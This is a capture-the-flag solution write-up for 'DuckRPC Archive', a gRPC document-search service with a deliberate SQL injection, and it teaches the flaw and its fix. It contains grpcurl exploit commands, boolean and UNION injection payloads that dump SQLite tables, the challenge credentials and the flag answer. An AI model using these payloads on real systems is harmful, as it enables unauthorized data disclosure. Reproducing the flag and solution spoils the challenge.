# DuckRPC Archive — Official Solution and Security Report

## 1. Executive Summary
DuckRPC Archive is a controlled Capture The Flag challenge designed to demonstrate the security risks associated with unsafe database query construction in a gRPC application.
The application provides authenticated employees with the ability to search internal documents through a gRPC service. The intended vulnerability exists in the document search functionality, where attacker-controlled input is directly incorporated into a SQL query.
A participant begins with valid credentials for a standard employee account. The intended attack path requires the participant to enumerate the exposed gRPC services, identify the available authentication and document search methods, authenticate successfully, understand the use of gRPC metadata for authentication, investigate the search functionality, identify the injection vulnerability, enumerate the SQLite database, and retrieve the flag from an internal database table.

### Primary Vulnerability
SQL Injection caused by unsafe string interpolation of user-controlled input into a database query.

### Security Impact
A successfully authenticated attacker can manipulate the SQL query used by the document search functionality and access data outside the intended `documents` table.
The demonstrated impact is unauthorized disclosure of sensitive internal database records, including the challenge flag.

### Learning Objective
The challenge is intended to teach participants how to:
* Enumerate gRPC services using server reflection.
* Discover available RPC methods and message definitions.
* Authenticate to a gRPC service.
* Use authentication data through gRPC metadata.
* Test gRPC input fields for injection vulnerabilities.
* Identify SQL injection through behavioral differences.
* Enumerate database structure using a UNION-based SQL injection.
* Retrieve sensitive information through the intended vulnerability.

---

# 2. Challenge Overview
## Challenge Name
DuckRPC Archive

## Application Functionality
The application provides two primary gRPC services:
* `duckrpc.AuthService`
* `duckrpc.ArchiveService`

The authentication service allows users to authenticate using a username and password.
The archive service allows authenticated users to search internal documents.
The application uses an SQLite database containing:
* User account information.
* Standard internal documents.
* Internal sensitive records.

The challenge flag is stored in an internal database record and is not intended to be returned through normal application functionality.

---

## Scenario
DuckRPC Archive is an internal document archive service used by employees to access and search company documents.
Participants are provided with credentials for a standard employee account and must investigate the exposed gRPC services.

---

## Primary Vulnerability
SQL Injection in the `SearchDocuments` RPC method.

---

## Secondary Vulnerability
None intentionally included.

---

## Difficulty
Medium

The difficulty is based on the requirement for chained investigation steps and service/database enumeration.
The intended solution requires:
1. gRPC service enumeration.
2. RPC method discovery.
3. Message inspection.
4. Authentication.
5. Metadata handling.
6. Input testing.
7. SQL injection identification.
8. Database enumeration.
9. Sensitive data extraction.

---

## Estimated Solve Time
Approximately 20–45 minutes for a participant familiar with:
* gRPC.
* `grpcurl`.
* Authentication metadata.
* SQL injection fundamentals.

---

# 3. Architecture and Trust Boundaries
## Components

```text
+----------------------+
|      Participant     |
|                      |
|      grpcurl         |
+----------+-----------+
           |
           | gRPC
           | TCP/50051
           v
+----------------------+
|   DuckRPC Archive    |
|                      |
|  AuthService         |
|  ArchiveService      |
|                      |
+----------+-----------+
           |
           | SQL
           v
+----------------------+
|      SQLite DB       |
|                      |
| users                |
| documents            |
| internal_records     |
+----------------------+
```

---

## Authentication Flow

```text
Participant
    |
    | Login(username, password)
    v
AuthService
    |
    | Validate credentials
    v
SQLite Database
    |
    | Generate token
    v
Participant
```

The application generates an authentication token after successful login.
The token must subsequently be provided through gRPC request metadata.
Example metadata:

```text
authorization: Bearer <TOKEN>
```

---

## Trust Boundaries
The primary trust boundaries are:
1. Participant input to the gRPC server.
2. Authentication credentials submitted to `AuthService`.
3. Authentication token validation.
4. Authenticated user input submitted to `ArchiveService`.
5. Application input passed to the SQLite database.

The intended vulnerability occurs when user-controlled input crosses the boundary between the application and the database without safe parameterization.

---

# 4. Attacker Starting Point
The participant starts with access to a standard employee account.

## Provided Credentials

```text
Username: alice
Password: AliceArchive2026!
```

## User Role

```text
employee
```

The participant does not begin with access to the internal sensitive records.
The participant is expected to investigate the exposed application functionality.

---

# 5. Attack Surface
The application exposes the following gRPC services through reflection:

```text
duckrpc.ArchiveService
duckrpc.AuthService
grpc.health.v1.Health
grpc.reflection.v1alpha.ServerReflection
```

---

## Authentication Service

```text
duckrpc.AuthService
```

Available method:

```text
Login
```

---

## Archive Service

```text
duckrpc.ArchiveService
```

Available method:

```text
SearchDocuments
```

The relevant attacker-controlled parameter is:

```text
query
```

---

# 6. Vulnerability Description
## Vulnerability Type
SQL Injection

## Affected Component

```text
duckrpc.ArchiveService.SearchDocuments
```

## Preconditions
The attacker must:
1. Access the local challenge environment.
2. Enumerate or otherwise identify the authentication service.
3. Authenticate successfully using valid employee credentials.
4. Obtain a valid authentication token.
5. Supply the token through gRPC metadata.

---

## Failed Security Control
The application fails to safely parameterize the user-controlled `query` value before using it in a SQL statement.

---

## Technical Root Cause
The vulnerable functionality constructs the SQL statement using direct string interpolation.
Conceptually, the vulnerable query is:

```sql
SELECT id, title, owner, content
FROM documents
WHERE title LIKE '%<USER_INPUT>%'
```

Because attacker-controlled input is inserted directly into the SQL statement, special SQL characters and expressions can alter the intended query structure.
The application does not use a parameterized query for the search value.

---

# 7. Intended Attack Path

## Step 1 — Enumerate Available gRPC Services
The participant begins by listing available services:

```bash
grpcurl -plaintext localhost:50051 list
```

Example output:

```text
duckrpc.ArchiveService
duckrpc.AuthService
grpc.health.v1.Health
grpc.reflection.v1alpha.ServerReflection
```

This confirms that gRPC reflection is enabled.

---

## Step 2 — Enumerate Authentication Methods
The participant lists the methods available in the authentication service:

```bash
grpcurl -plaintext localhost:50051 list duckrpc.AuthService
```

Example output:

```text
duckrpc.AuthService.Login
```

The service definition can then be inspected:

```bash
grpcurl -plaintext localhost:50051 describe duckrpc.AuthService
```

The request message can also be inspected:

```bash
grpcurl -plaintext localhost:50051 describe duckrpc.LoginRequest
```

This reveals the required authentication fields:

```text
username
password
```

---

## Step 3 — Authenticate
The provided employee credentials are submitted to the login method:

```bash
grpcurl -plaintext \
-d "{\"username\":\"alice\",\"password\":\"AliceArchive2026!\"}" \
localhost:50051 \
duckrpc.AuthService/Login
```

Example response:

```json
{
  "token": "<TOKEN>"
}
```

The token is required for authenticated archive operations.

---

## Step 4 — Enumerate Archive Methods
The participant enumerates the archive service:

```bash
grpcurl -plaintext localhost:50051 list duckrpc.ArchiveService
```

Example output:

```text
duckrpc.ArchiveService.SearchDocuments
```

The service can be inspected:

```bash
grpcurl -plaintext localhost:50051 describe duckrpc.ArchiveService
```

The request message can be inspected:

```bash
grpcurl -plaintext localhost:50051 describe duckrpc.SearchRequest
```

The relevant input field is:

```text
query
```

---

## Step 5 — Perform an Authenticated Search
The participant sends the authentication token through gRPC metadata.

Example:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"\"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

The application returns normal document records.
This establishes the expected baseline behavior.

---

## Step 6 — Test the Query Parameter
The participant tests whether the search parameter behaves differently when supplied with SQL expressions.
A false condition:

```text
' AND 1=2 -- 
```

Example command:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' AND 1=2 -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

This returns no document results.

A true condition:

```text
' AND 1=1 -- 
```

Example command:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' AND 1=1 -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

This returns document results.

The behavioral difference demonstrates that the user-controlled input is influencing the underlying SQL query.

---

## Step 7 — Enumerate Database Tables
The participant uses a UNION-based query to retrieve table names from SQLite metadata.
Example payload:

```text
' UNION SELECT 1, name, 'x', 'x'
FROM sqlite_master
WHERE type='table' -- 
```

Example command:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' UNION SELECT 1, name, 'x', 'x' FROM sqlite_master WHERE type='table' -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

Example relevant results include:

```text
documents
internal_records
users
```

The presence of an internal records table provides the next investigation target.

---

## Step 8 — Extract Internal Records

The participant queries the internal records table using the UNION injection.
Example payload:

```text
' UNION SELECT id, record_name, 'internal', record_value
FROM internal_records -- 
```

Example command:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' UNION SELECT id, record_name, 'internal', record_value FROM internal_records -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

The application returns the sensitive internal record containing the challenge flag.

---

# 8. Impact Assessment
## Confidentiality
Impact is demonstrated.
An authenticated employee can manipulate the document search query and retrieve information outside the intended `documents` table.
The challenge demonstrates access to:
* Database table names.
* Internal record names.
* Internal record values.
* The challenge flag.

---

## Integrity
No integrity impact is intentionally demonstrated.
The intended challenge path focuses on unauthorized data retrieval.

---

## Availability
No availability impact is intentionally demonstrated.

---

## Privileges and Data Access
The attacker remains authenticated as a standard employee.
No privilege escalation is required.
The security boundary crossed is the database access boundary between normal document search functionality and sensitive internal database records.

---

# 9. Flag Retrieval
## Required Condition
The participant must successfully exploit the SQL injection vulnerability in the authenticated document search functionality.

---

## Flag Location
The flag is stored as a sensitive value in the internal records database table.
The flag is not intended to be returned through normal document search functionality.

---

## Evidence of Successful Exploitation
Successful exploitation returns a document-like response containing the internal record.
The final flag format is:

```text
duck{...}
```

The configured challenge flag is:

```text
duck{sqli_with_grpc_is_fantastic}
```

---

# 10. Root Cause
The root cause is unsafe SQL query construction.
The application directly incorporates attacker-controlled input into a SQL statement using string interpolation.
The intended secure boundary fails because the search parameter is treated as executable SQL syntax rather than strictly as data.
The application should have used a parameterized query.

---

# 11. Remediation
The vulnerable SQL query should be replaced with a parameterized query.

## Vulnerable Pattern
Conceptually:

```python
sql = f"""
    SELECT id, title, owner, content
    FROM documents
    WHERE title LIKE '%{query}%'
"""
```

## Recommended Secure Pattern

```python
sql = """
    SELECT id, title, owner, content
    FROM documents
    WHERE title LIKE ?
"""

cursor.execute(
    sql,
    (f"%{query}%",)
)
```

The application should ensure that:
* All database queries use parameterized statements.
* User-controlled input is never concatenated directly into SQL statements.
* Database accounts operate with the minimum required privileges where applicable.
* Sensitive internal data is separated from normal application-accessible data where appropriate.
* Regression tests verify that injection payloads do not alter query behavior.

---

# 12. Verification and Retest
After remediation, the following behavior should be verified.

## Normal Search
A normal search should continue to return matching document records.

Example:

```text
Security
```

Expected behavior:

```text
Relevant documents are returned.
```

---

## SQL Injection Test

The following input:

```text
' AND 1=1 -- 
```

Should be treated as literal search text.

Expected behavior:

```text
No SQL syntax manipulation occurs.
```

The input must not alter the logical behavior of the SQL statement.

---

## UNION Injection Test
A payload such as:

```text
' UNION SELECT 1, name, 'x', 'x'
FROM sqlite_master
WHERE type='table' -- 
```

Must not return database metadata.

Expected behavior:

```text
The payload is handled as ordinary search input.
```

---

# 13. Unintended Attack Paths
The challenge was designed to avoid unrelated attack paths.
The intended implementation does not include:
* BOLA.
* IDOR.
* GraphQL functionality.
* REST application endpoints.
* Authentication bypass.
* Privilege escalation.

The challenge uses valid employee credentials as the participant starting point.
Authentication is required before accessing the vulnerable archive functionality.
The intended vulnerability is SQL injection in the authenticated search functionality.
During testing, previously issued authentication tokens became invalid after application restart because tokens are stored in application memory. This is expected behavior and does not provide an alternative path to the flag.
The challenge should be tested from a clean environment before submission to identify any additional unintended paths.

---

# 14. Conclusion
DuckRPC Archive demonstrates how traditional SQL injection vulnerabilities can occur in modern API architectures, including applications that expose functionality through gRPC rather than REST.

The challenge requires participants to combine multiple investigation steps:
* gRPC service discovery.
* RPC method enumeration.
* Message inspection.
* Authentication.
* Metadata handling.
* Input testing.
* SQL injection detection.
* Database enumeration.
* Sensitive data extraction.

The successful attack demonstrates a confidentiality impact caused by unsafe SQL query construction.

The core security lesson is that the transport protocol does not eliminate traditional injection risks. gRPC applications must apply the same secure database practices expected in other application architectures, including parameterized queries and strict separation between executable SQL and untrusted input.